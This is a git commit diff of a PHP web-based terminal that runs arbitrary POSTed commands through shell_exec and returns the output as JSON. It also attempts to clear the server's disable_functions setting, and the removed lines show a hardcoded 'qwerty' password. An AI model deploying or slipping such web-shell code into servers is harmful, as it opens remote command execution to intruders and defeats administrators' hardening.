4447e31f658f037f3698aef0d24ecd922a342671
Joe Ford <ford153focus@gmail.com>
2022-05-26 06:48:10 +0300

    accumulate changes

--- src/index.php
+++ src/index.php
@@ -8,77 +8,67 @@
 
 session_start();
 
-$password = 'qwerty';
+require('auth.php');
+require('CoreUtils.php');
 
 function directorySwitch($queryString)
 {
-	//look in session for previous working directory changes
-	if ($_SESSION['workingDirectory'])
-	{
-		chdir($_SESSION['workingDirectory']);
-	}
-
 	//look in current query for directory changes
 	if (preg_match_all('/(^|\s)cd\s(\S+)(\s|$)/', $queryString, $matches))
 	{
 		$_SESSION['workingDirectory'] = end($matches[2]);
-		chdir($_SESSION['workingDirectory']);
 	}
+
+    //look in session for working directory
+    if ($_SESSION['workingDirectory'])
+    {
+        chdir($_SESSION['workingDirectory']);
+    }
 }
 
+/**
+ * @noinspection MissingOrEmptyGroupStatementInspection
+ */
 function allowShellExec ()
 {
-
-	if (strpos(ini_get('disable_functions'), 'shell_exec') === false || ini_set('disable_functions','') )
-	{
-		return true;
-	}
+	if (strpos(ini_get('disable_functions'), 'shell_exec') === false) return true;
+    if (ini_set('disable_functions','')) return true;
 	return false;
 }
 
-function getCurrentUserWorkaround ()
-{
-	file_put_contents("testFile", "test");
-	$user = fileowner("testFile");
-	unlink("testFile");
-	return $user;
+/**
+ * @TODO Not Implemented
+ *
+ * @param $cmd
+ *
+ * @return string
+ */
+function fake_shell_exec($cmd) {
+    return 'shell_exec() is not allowed on this server';
 }
 
 function processRequest()
 {
-	//checking for existing and non-empty request
-	if (isset($_POST['query']) && $_POST['query'] != '')
-	{
-		directorySwitch($_POST['query']);
-		$shellExecAllowed = allowShellExec();
-		echo(
-			json_encode(
-				array(
-					'currentUser' => $shellExecAllowed ? trim(shell_exec('whoami')) : getCurrentUserWorkaround(),
-					'hostName' => php_uname('n'),
-					'currentDirectory' => getcwd(),
-					'commandOutput' => $shellExecAllowed ? trim(shell_exec($_POST['query'])) : 'shell_exec() is not allowed on this server'
-				)
-			)
-		);
-	}
-	else
-	{
-		require('terminal.html');
-	}
+    //checking for existing and non-empty request
+    if (!isset($_POST['query']) || $_POST['query'] === '')
+    {
+        require('terminal.html');
+        return;
+    }
+
+    directorySwitch($_POST['query']);
+    $shellExecAllowed = allowShellExec();
+
+    $output = array(
+        'currentUser' => $shellExecAllowed ? trim(shell_exec('whoami')) : CoreUtils::whoami(),
+        'hostName' => php_uname('n'),
+        'currentDirectory' => getcwd(),
+        'commandOutput' => $shellExecAllowed ? trim(shell_exec($_POST['query'])) :  trim(fake_shell_exec($_POST['query']))
+    );
+
+    $output = json_encode($output);
+
+    echo $output;
 }
 
-if ($_SESSION['isAuthorized'] == true)
-{
-	processRequest();
-}
-elseif ($_POST['password'] == $password)
-{
-	$_SESSION['isAuthorized'] = true;
-	processRequest();
-}
-else
-{
-	require('login.php');
-}
-
+processRequest();
